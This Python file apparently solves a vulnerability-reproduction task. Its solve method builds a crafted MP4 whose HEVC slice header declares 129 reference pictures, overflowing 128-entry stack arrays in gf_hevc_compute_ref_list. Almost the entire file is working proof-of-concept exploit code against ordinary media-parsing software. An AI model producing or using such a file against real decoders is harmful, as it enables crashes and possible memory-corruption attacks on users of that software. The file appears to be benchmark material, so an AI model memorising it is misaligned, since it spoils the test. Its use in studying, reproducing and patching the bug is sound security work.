import struct

class Solution:
    """
    Generates a Proof-of-Concept (PoC) input that triggers a Stack Buffer Overflow
    vulnerability in gf_hevc_compute_ref_list().
    """

    def solve(self, src_path: str) -> bytes:
        """
        Generates the PoC input.

        The vulnerability is a stack buffer overflow in `gf_hevc_compute_ref_list`
        caused by processing a crafted HEVC slice header. The function uses fixed-size
        stack arrays (`RefPicList0[128]`, `RefPicList1[128]`) to store reference
        picture POCs. By specifying a large number of reference pictures in the
        slice's Reference Picture Set (RPS), we can cause the function to write
        out of bounds.

        This PoC constructs a minimal MP4 file containing an HEVC track. The track's
        single sample is a P-slice with a custom RPS in its header. The RPS is
        configured with 129 negative reference pictures. This number exceeds the
        stack buffer's capacity of 128, triggering the overflow when the reference
        list is computed.

        Args:
            src_path: Path to the vulnerable source code tarball (unused).

        Returns:
            bytes: The PoC data as a minimal MP4 file.
        """

        class BitWriter:
            """A helper class to write bitstreams."""
            def __init__(self):
                self.bits = ""

            def write(self, value: int, num_bits: int):
                self.bits += format(value, 'b').zfill(num_bits)

            def write_ue(self, value: int):
                """Writes an unsigned integer using Exp-Golomb coding."""
                if value < 0:
                    raise ValueError("Cannot encode negative value with ue(v)")
                v = value + 1
                binary = format(v, 'b')
                length = len(binary)
                self.bits += '0' * (length - 1)
                self.bits += binary

            def get_bytes(self) -> bytes:
                """Finalizes the bitstream with RBSP trailing bits and returns as bytes."""
                self.bits += '1'  # rbsp_stop_one_bit
                while len(self.bits) % 8 != 0:
                    self.bits += '0'  # rbsp_alignment_zero_bit
                
                byte_array = bytearray()
                for i in range(0, len(self.bits), 8):
                    byte_array.append(int(self.bits[i:i+8], 2))
                return bytes(byte_array)

        def make_box(box_type: bytes, content: bytes) -> bytes:
            """Creates an MP4 box with a given type and content."""
            return struct.pack('>I', 8 + len(content)) + box_type + content

        # 1. Define minimal HEVC NAL units for the hvcC configuration box.
        vps_nalu = b'\x40\x01\x0c\x01\xff\xff\x01\x40\x00\x00\x03\x00\x00\x03\x00\x00\x03\x00\x00'
        # SPS specifies 32x32 video, and log2_max_pic_order_cnt_lsb_minus4=4
        sps_nalu = b'\x42\x01\x01\x01\x40\x00\x00\x03\x00\x00\x03\x00\x00\x03\x00\x00\xa0\x08\x08\x02\x00\x00\x03\x00\x02\x00\x00\x03\x00\x78\x99\x60'
        pps_nalu = b'\x44\x01\xc1\x73\xd1\x89'

        # 2. Create the malicious slice NAL unit.
        bw = BitWriter()
        # Slice Header for a P-slice
        bw.write(1, 1)  # first_slice_segment_in_pic_flag = 1
        bw.write_ue(0)  # slice_pic_parameter_set_id
        bw.write_ue(1)  # slice_type = P_slice
        # pic_order_cnt_lsb: SPS log2_max_poc_lsb_minus4 is 4, so POC is 4+4=8 bits
        bw.write(0, 8)
        bw.write(0, 1)  # short_term_ref_pic_set_sps_flag = 0 (RPS is in slice header)

        # Custom RPS (Reference Picture Set) to trigger the overflow
        bw.write(0, 1)  # inter_ref_pic_set_prediction_flag = 0
        bw.write_ue(129) # num_negative_pics: > 128 to overflow the buffer
        bw.write_ue(0)  # num_positive_pics

        # Define the 129 negative reference pictures
        for _ in range(129):
            bw.write_ue(0)  # delta_poc_s0_minus1[i]
            bw.write(1, 1)    # used_by_curr_pic_s0_flag[i] = 1

        bw.write_ue(0)  # num_long_term_sps
        bw.write_ue(0)  # num_long_term_pics
        bw.write(0, 1)  # slice_temporal_mvp_enabled_flag = 0

        slice_rbsp = bw.get_bytes()
        slice_nalu = b'\x02\x01' + slice_rbsp  # NALU header for P-slice

        # 3. Assemble the MP4 file structure.
        ftyp = make_box(b'ftyp', b'isom\x00\x00\x00\x01mp41')
        
        # Movie Header Box
        mvhd = make_box(b'mvhd', b'\x00\x00\x00\x00' + struct.pack('>II', 0, 0) + 
                                  struct.pack('>I', 1000) + struct.pack('>I', 0) + 
                                  b'\x00\x01\x00\x00' + b'\x01\x00' + b'\x00' * 10 +
                                  b'\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00' +
                                  b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' +
                                  b'\x40\x00\x00\x00' + b'\x00\x00\x00\x02')
        # Track Header Box
        tkhd = make_box(b'tkhd', b'\x00\x00\x00\x07' + struct.pack('>II', 0, 0) +
                                  struct.pack('>I', 1) + b'\x00' * 4 + struct.pack('>I', 0) + b'\x00' * 8 +
                                  b'\x00\x00\x00\x00' + b'\x01\x00\x00\x00' +
                                  b'\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00' +
                                  b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00' +
                                  struct.pack('>H', 32) + b'\x00\x00' + struct.pack('>H', 32) + b'\x00\x00')
        # Media Header Box
        mdhd = make_box(b'mdhd', b'\x00\x00\x00\x00' + struct.pack('>II', 0, 0) +
                                  struct.pack('>I', 1000) + struct.pack('>I', 0) +
                                  b'\x55\xc4\x00\x00')
        # Handler Reference Box
        hdlr = make_box(b'hdlr', b'\x00\x00\x00\x00' * 2 + b'vide' + b'\x00' * 12 + b'VideoHandler\x00')
        # Video Media Header Box
        vmhd = make_box(b'vmhd', b'\x00\x00\x00\x01' + b'\x00' * 8)
        dref = make_box(b'dref', b'\x00\x00\x00\x00\x00\x00\x00\x01' + make_box(b'url ', b'\x00\x00\x00\x01'))
        dinf = make_box(b'dinf', dref)

        # HEVC Decoder Configuration Box
        hvcC_config = (
            b'\x01\x01\x60\x00\x00\x00\x90\x00\x00\x00\x00\x00\x78\xf0\x00\xfc\xfd\xff\xff\x00\x00\x00\x03' +
            b'\x20' + struct.pack('>H', 1) + struct.pack('>H', len(vps_nalu)) + vps_nalu +
            b'\x21' + struct.pack('>H', 1) + struct.pack('>H', len(sps_nalu)) + sps_nalu +
            b'\x22' + struct.pack('>H', 1) + struct.pack('>H', len(pps_nalu)) + pps_nalu
        )
        hvcC = make_box(b'hvcC', hvcC_config)
        
        # Sample Description Box
        hvc1 = make_box(b'hvc1', b'\x00'*6 + b'\x00\x01' + b'\x00'*16 +
                                  struct.pack('>HH', 32, 32) +
                                  b'\x00\x48\x00\x00\x00\x48\x00\x00' + b'\x00'*4 + b'\x00\x01' +
                                  b'\x00'*32 + b'\x00\x18\xff\xff' + hvcC)
        stsd = make_box(b'stsd', b'\x00\x00\x00\x00\x00\x00\x00\x01' + hvc1)
        stts = make_box(b'stts', b'\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x03\xe8')
        stsc = make_box(b'stsc', b'\x00\x00\x00\x00\x00\x00\x00\x01' * 5)
        stsz = make_box(b'stsz', b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01' + struct.pack('>I', len(slice_nalu)))
        
        # Build hierarchy and calculate offset for stco
        stbl_content_no_stco = stsd + stts + stsc + stsz
        stbl_no_stco = make_box(b'stbl', stbl_content_no_stco)
        minf_no_stco = make_box(b'minf', vmhd + dinf + stbl_no_stco)
        mdia_no_stco = make_box(b'mdia', mdhd + hdlr + minf_no_stco)
        trak_no_stco = make_box(b'trak', tkhd + mdia_no_stco)
        moov_no_stco = make_box(b'moov', mvhd + trak_no_stco)
        
        # The offset points to the start of mdat data
        mdat_offset = len(ftyp) + len(moov_no_stco) + 16 # Add size of stco itself
        stco = make_box(b'stco', b'\x00\x00\x00\x00\x00\x00\x00\x01' + struct.pack('>I', mdat_offset + 8))
        
        # Final assembly with correct stco
        stbl = make_box(b'stbl', stbl_content_no_stco + stco)
        minf = make_box(b'minf', vmhd + dinf + stbl)
        mdia = make_box(b'mdia', mdhd + hdlr + minf)
        trak = make_box(b'trak', tkhd + mdia)
        moov = make_box(b'moov', mvhd + trak)
        
        mdat = make_box(b'mdat', slice_nalu)

        return ftyp + moov + mdat
